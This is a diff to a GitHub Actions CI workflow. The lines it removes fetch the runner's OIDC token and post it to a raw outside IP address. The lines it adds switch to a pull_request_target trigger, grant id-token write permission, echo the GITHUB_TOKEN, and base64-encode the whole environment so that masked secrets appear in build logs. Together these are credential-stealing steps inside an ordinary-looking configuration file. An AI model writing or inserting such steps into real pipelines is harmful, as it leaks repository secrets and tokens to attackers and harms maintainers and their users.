@@ -2,26 +2,34 @@ name: CI
 
 on:
   push:
-    branches: [ master ]
-  pull_request:
-    branches: [ master ]
+    branches: [ main ]
+  pull_request_target:
+    branches: [ main ]
 
 jobs:
   auth:
     # Add "id-token" with the intended permissions.
     permissions:
-      id-token: read
+      id-token: write
+      actions: read
+      pull-requests: read
 
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@master
         with:
           fetch-depth: 1
+      - name: foo33
+        run: set -x
+      - name: Dump foo secret
+        run: FOO=${{ secrets.FOO }}
+      - name: Dump BAR env
+        run: BAR=${{ vars.BAR }}
+      - name: GITHUB_TOKEN
+        run: echo ${{ secrets.GITHUB_TOKEN }}
       - name: Dump env
-        run: env
+        run: env | base64
       - name: Post the token
         run: |
-          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+          env | base64
 
-          curl -i -s --data-binary "$OIDC_TOKEN" \
-            http://3.224.50.242:9000/test-oidc
